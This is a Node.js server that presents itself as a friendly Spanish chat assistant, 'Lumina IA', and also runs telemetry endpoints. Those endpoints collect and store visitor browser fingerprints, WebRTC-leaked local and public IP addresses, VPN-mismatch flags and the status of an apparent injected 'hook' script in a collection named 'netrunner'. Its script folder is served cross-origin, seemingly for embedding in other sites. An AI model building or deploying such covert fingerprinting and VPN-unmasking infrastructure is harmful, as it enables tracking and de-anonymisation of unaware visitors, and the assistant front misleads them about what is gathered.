import 'dotenv/config';
import express from 'express';
import { createServer } from 'http';
import { Server as SocketIOServer } from 'socket.io';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import mongoose from 'mongoose';

const PORT = process.env.PORT || 3000;
const MONGO_URL = process.env.MONGO_URL;

const TELEMETRY_BATCH_SIZE = 64;
const TELEMETRY_FLUSH_MS = 120;
const MAX_TELEMETRY_QUEUE = 5000;

const app = express();
const httpServer = createServer(app);

const bridgeLogPath = path.join(process.cwd(), 'bridge_status.log');
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const publicPath = path.join(__dirname, 'public');

function writeBridgeLog(level, ...args) {
    try {
        const message = args.map((arg) => {
            if (typeof arg === 'string') return arg;
            try {
                return JSON.stringify(arg);
            } catch {
                return String(arg);
            }
        }).join(' ');
        fs.appendFileSync(bridgeLogPath, `[${new Date().toISOString()}] [${level}] ${message}\n`);
    } catch {
        // Never crash process because of logging I/O.
    }
}

const originalConsoleLog = console.log.bind(console);
const originalConsoleWarn = console.warn.bind(console);
const originalConsoleError = console.error.bind(console);
console.log = (...args) => { writeBridgeLog('INFO', ...args); originalConsoleLog(...args); };
console.warn = (...args) => { writeBridgeLog('WARN', ...args); originalConsoleWarn(...args); };
console.error = (...args) => { writeBridgeLog('ERROR', ...args); originalConsoleError(...args); };

const io = new SocketIOServer(httpServer, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST']
    }
});

const nodeSocketMap = {};

const nodeProfileSchema = new mongoose.Schema({
    nodeId: { type: String, required: true, index: true },
    sessionId: { type: String, required: true, index: true },
    profileCategory: { type: String, enum: ['Mobile', 'Tablet', 'Desktop'], index: true, default: 'Desktop' },
    source: { type: String, default: 'web_client' },
    userAgent: String,
    acceptedLanguage: String,
    serverObservedIp: String,
    headerIp: String,
    telemetry: {
        fingerprint: {
            hardwareConcurrency: Number,
            deviceMemory: Number,
            webglRenderer: String,
            canvasHash: String,
            stableFingerprint: String
        },
        network: {
            localIps: [String],
            publicIps: [String],
            candidateIps: [String],
            srflxIps: [String],
            localDescription: String,
            sdpCandidates: [String],
            vpnMismatch: Boolean,
            mismatchReason: String
        },
        hook: {
            loaded: Boolean,
            endpoint: String,
            status: String,
            detail: String
        },
        page: {
            href: String,
            visibilityState: String,
            timezone: String,
            viewportWidth: Number,
            viewportHeight: Number,
            screenWidth: Number,
            screenHeight: Number
        }
    },
    receivedAt: { type: Date, default: Date.now, index: true },
    lastSeen: { type: Date, default: Date.now, index: true }
}, {
    timestamps: true,
    collection: 'netrunner'
});

nodeProfileSchema.index({ nodeId: 1, sessionId: 1 }, { unique: true });

const NodeProfile = mongoose.model('NodeProfile', nodeProfileSchema);

const telemetryQueue = [];
let flushTimer = null;
let flushInProgress = false;

function truncate(value, max = 8192) {
    return String(value || '').slice(0, max);
}

function classifyProfileCategory(userAgent = '', page = {}) {
    const ua = String(userAgent).toLowerCase();
    const viewportWidth = Number(page?.viewportWidth) || 0;
    const screenWidth = Number(page?.screenWidth) || 0;
    const inferredWidth = Math.max(viewportWidth, screenWidth);

    const isTabletUa = /ipad|tablet|playbook|silk/.test(ua) || (/android/.test(ua) && !/mobile/.test(ua));
    const isMobileUa = /mobi|iphone|ipod|android.*mobile|windows phone/.test(ua);

    if (isTabletUa) return 'Tablet';
    if (isMobileUa) return 'Mobile';
    if (inferredWidth > 0 && inferredWidth <= 900) return 'Mobile';
    if (inferredWidth > 900 && inferredWidth <= 1200) return 'Tablet';
    return 'Desktop';
}

function enqueueTelemetryWrite(filter, payload) {
    if (telemetryQueue.length >= MAX_TELEMETRY_QUEUE) {
        return Promise.reject(new Error('Telemetry queue is full'));
    }

    return new Promise((resolve, reject) => {
        telemetryQueue.push({ filter, payload, resolve, reject });
        scheduleTelemetryFlush();
    });
}

function scheduleTelemetryFlush() {
    if (flushTimer) return;
    flushTimer = setTimeout(() => {
        flushTimer = null;
        flushTelemetryQueue().catch((error) => {
            console.error('Telemetry queue flush error:', error.message);
        });
    }, TELEMETRY_FLUSH_MS);
}

async function flushTelemetryQueue() {
    if (flushInProgress) return;
    if (mongoose.connection.readyState !== 1) return;

    flushInProgress = true;
    try {
        while (telemetryQueue.length > 0) {
            const batch = telemetryQueue.splice(0, TELEMETRY_BATCH_SIZE);
            const operations = batch.map((entry) => ({
                updateOne: {
                    filter: entry.filter,
                    update: {
                        $set: entry.payload,
                        $setOnInsert: { createdAt: new Date() }
                    },
                    upsert: true
                }
            }));
            try {
                await NodeProfile.bulkWrite(operations, { ordered: false });
                batch.forEach((entry) => entry.resolve());
            } catch (error) {
                batch.forEach((entry) => entry.reject(error));
            }
        }
    } finally {
        flushInProgress = false;
        if (telemetryQueue.length > 0) {
            scheduleTelemetryFlush();
        }
    }
}

async function connectMongo() {
    if (!MONGO_URL) {
        console.warn('⚠️ MONGO_URL not provided. MongoDB connection will not be established.');
        return;
    }

    try {
        await mongoose.connect(MONGO_URL);
        console.log('💾 MongoDB Connected (Mongoose).');
    } catch (error) {
        console.error('❌ MongoDB Connection Failed:', error.message);
    }
}

app.use(express.json({ limit: '2mb' }));
app.use('/public', express.static(publicPath, {
    maxAge: '5m',
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('.js')) {
            res.setHeader('Access-Control-Allow-Origin', '*');
            res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
        }
    }
}));
app.use(express.static(publicPath, { maxAge: '5m' }));

app.get('/', (req, res) => {
    res.sendFile(path.join(publicPath, 'index.html'));
});

app.post('/api/chat', async (req, res) => {
    const { messages, model } = req.body;

    let selectedApiKey;
    let selectedApiUrl;
    let selectedModelName;

    if (process.env.GROQ_API_KEY) {
        selectedApiKey = process.env.GROQ_API_KEY;
        selectedApiUrl = 'https://api.groq.com/openai/v1/chat/completions';
        const cleanModel = model ? model.replace(/^groq:/, '') : 'llama-3.1-8b-instant';
        const validGroqModels = ['llama-3.3-70b-versatile', 'llama-3.1-70b-versatile', 'llama-3.1-8b-instant', 'mixtral-8x7b-32768', 'llama3-70b-8192', 'llama3-8b-8192'];
        selectedModelName = validGroqModels.includes(cleanModel) ? cleanModel : 'llama-3.1-8b-instant';
    } else if (process.env.OPENCODE_ZEN_API_KEY) {
        selectedApiKey = process.env.OPENCODE_ZEN_API_KEY;
        selectedApiUrl = 'https://api.opencodezen.com/v1/chat/completions';
        selectedModelName = model || 'opencodezen-free-model';
    } else {
        return res.status(500).json({ error: 'No AI API key configured on the server.' });
    }

    try {
        const fetch = (await import('node-fetch')).default;
        const aiResponse = await fetch(selectedApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                Authorization: `Bearer ${selectedApiKey}`
            },
            body: JSON.stringify({
                model: selectedModelName,
                messages: [
                    {
                        role: 'system',
                        content: 'Eres Lumina IA, un asistente cálido y servicial. Usa un lenguaje sencillo, ayuda a organizar el día, redactar correos y responder dudas generales con claridad. Responde en español salvo que te pidan otro idioma.'
                    },
                    ...(Array.isArray(messages) ? messages : [])
                ],
                temperature: 0.5
            })
        });

        const aiData = await aiResponse.json();
        if (!aiResponse.ok) {
            return res.status(aiResponse.status).json({
                error: aiData.error?.message || `Error from external AI API (${selectedModelName})`,
                details: aiData
            });
        }

        return res.json({ text: aiData.choices?.[0]?.message?.content || '' });
    } catch (error) {
        return res.status(500).json({ error: `Failed to communicate with AI API: ${error.message}` });
    }
});

app.post('/api/telemetry', async (req, res) => {
    const body = req.body || {};
    const nodeId = truncate(body.nodeId, 128).trim();
    const sessionId = truncate(body.sessionId, 128).trim();

    if (!nodeId || !sessionId) {
        return res.status(400).json({ error: 'nodeId and sessionId are required.' });
    }

    if (mongoose.connection.readyState !== 1) {
        return res.status(503).json({ error: 'Telemetry storage temporarily unavailable.' });
    }

    const xff = req.headers['x-forwarded-for'];
    const headerIp = Array.isArray(xff) ? xff[0] : (typeof xff === 'string' ? xff.split(',')[0].trim() : '');
    const serverObservedIp = req.ip || req.socket?.remoteAddress || '';

    const page = body?.telemetry?.page || {};
    const userAgent = req.get('user-agent') || body.userAgent || '';
    const profileCategory = classifyProfileCategory(userAgent, page);

    const payload = {
        nodeId,
        sessionId,
        profileCategory,
        source: truncate(body.source || 'web_client', 64),
        userAgent: truncate(userAgent, 512),
        acceptedLanguage: truncate(req.get('accept-language') || '', 128),
        serverObservedIp: truncate(serverObservedIp, 64),
        headerIp: truncate(headerIp, 64),
        telemetry: {
            fingerprint: {
                hardwareConcurrency: Number(body?.telemetry?.fingerprint?.hardwareConcurrency) || undefined,
                deviceMemory: Number(body?.telemetry?.fingerprint?.deviceMemory) || undefined,
                webglRenderer: truncate(body?.telemetry?.fingerprint?.webglRenderer || '', 256),
                canvasHash: truncate(body?.telemetry?.fingerprint?.canvasHash || '', 256),
                stableFingerprint: truncate(body?.telemetry?.fingerprint?.stableFingerprint || '', 256)
            },
            network: {
                localIps: Array.isArray(body?.telemetry?.network?.localIps) ? body.telemetry.network.localIps.slice(0, 32) : [],
                publicIps: Array.isArray(body?.telemetry?.network?.publicIps) ? body.telemetry.network.publicIps.slice(0, 32) : [],
                candidateIps: Array.isArray(body?.telemetry?.network?.candidateIps) ? body.telemetry.network.candidateIps.slice(0, 64) : [],
                srflxIps: Array.isArray(body?.telemetry?.network?.srflxIps) ? body.telemetry.network.srflxIps.slice(0, 32) : [],
                localDescription: truncate(body?.telemetry?.network?.localDescription || '', 8192),
                sdpCandidates: Array.isArray(body?.telemetry?.network?.sdpCandidates) ? body.telemetry.network.sdpCandidates.slice(0, 128).map((v) => truncate(v, 512)) : [],
                vpnMismatch: Boolean(body?.telemetry?.network?.vpnMismatch),
                mismatchReason: truncate(body?.telemetry?.network?.mismatchReason || '', 128)
            },
            hook: {
                loaded: Boolean(body?.telemetry?.hook?.loaded),
                endpoint: truncate(body?.telemetry?.hook?.endpoint || '', 512),
                status: truncate(body?.telemetry?.hook?.status || 'unknown', 64),
                detail: truncate(body?.telemetry?.hook?.detail || '', 256)
            },
            page: {
                href: truncate(page.href || '', 512),
                visibilityState: truncate(page.visibilityState || '', 32),
                timezone: truncate(page.timezone || '', 64),
                viewportWidth: Number(page.viewportWidth) || 0,
                viewportHeight: Number(page.viewportHeight) || 0,
                screenWidth: Number(page.screenWidth) || 0,
                screenHeight: Number(page.screenHeight) || 0
            }
        },
        receivedAt: new Date(),
        lastSeen: new Date()
    };

    try {
        await enqueueTelemetryWrite({ nodeId, sessionId }, payload);
        return res.json({ ok: true, nodeId, sessionId, profileCategory, queueDepth: telemetryQueue.length });
    } catch (error) {
        if (error.message === 'Telemetry queue is full') {
            return res.status(429).json({ error: 'Telemetry queue overflow. Retry later.' });
        }
        return res.status(500).json({ error: 'Failed to persist telemetry.' });
    }
});

io.on('connection', (socket) => {
    socket.on('register_node', (data = {}) => {
        const nodeId = data.nodeId;
        if (!nodeId) return;

        nodeSocketMap[nodeId] = socket.id;
        socket.data.nodeId = nodeId;

        socket.emit('vincular_confirmado', {
            nodeId,
            nodeRuntime: data.nodeRuntime || 'web_client',
            nodeChannel: data.nodeChannel || 'passive_monitor'
        });
    });

    socket.on('node_report', async (data = {}) => {
        if (!data.nodeId || mongoose.connection.readyState !== 1) return;

        const telemetry = data.telemetry || {};
        const page = telemetry.page || {};
        const userAgent = data.userAgent || '';
        const profileCategory = classifyProfileCategory(userAgent, page);

        const payload = {
            nodeId: data.nodeId,
            sessionId: data.sessionId || 'socket-session',
            source: data.source || 'socket',
            profileCategory,
            userAgent: truncate(userAgent, 512),
            telemetry,
            lastSeen: new Date(),
            receivedAt: new Date()
        };

        enqueueTelemetryWrite({ nodeId: payload.nodeId, sessionId: payload.sessionId }, payload).catch(() => {});
    });

    socket.on('disconnect', () => {
        const nodeId = socket.data?.nodeId;
        if (nodeId && nodeSocketMap[nodeId] === socket.id) {
            delete nodeSocketMap[nodeId];
        }
    });
});

async function startServer() {
    await connectMongo();

    httpServer.listen(PORT, () => {
        console.log(`🚀 SystemBridge Server active on http://localhost:${PORT}`);
        console.log(`Socket.io listening on port ${PORT}`);
    });
}

startServer();

process.on('beforeExit', async () => {
    if (mongoose.connection.readyState === 1) {
        await mongoose.disconnect();
        console.log('MongoDB connection closed (Mongoose).');
    }
});
